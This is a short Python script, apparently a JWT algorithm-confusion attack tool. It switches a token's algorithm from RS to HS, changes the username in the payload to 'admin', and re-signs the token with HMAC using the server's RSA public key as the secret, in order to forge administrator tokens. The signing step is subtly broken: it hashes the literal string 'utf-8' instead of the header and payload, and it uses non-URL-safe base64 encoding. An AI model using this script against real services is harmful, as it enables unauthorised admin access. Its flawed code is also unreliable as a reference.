import hmac, base64, hashlib

token = str(input("What is your JWT?: "))
login = str(input("What is your username?: "))
key = str(input("What is the RSA Public Key?: "))
token = token.split(".")

header = base64.b64decode(token[0]+"=").decode("utf-8")
header = header.replace("RS", "HS")
header = base64.b64encode(header.encode("utf-8")).decode("utf-8")

payload = base64.b64decode(token[1]+"=").decode("utf-8")
payload = payload.replace(login, "admin")
payload = base64.b64encode(payload.encode("utf-8")).decode("utf-8")

signature = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding='utf8'),str.encode('utf-8'),hashlib.sha256).digest()).decode('utf-8')

token = header + "." + payload + "." + signature
token = token.replace("=","")

print("\n\n\t*** Your new token is:\n\n",token)
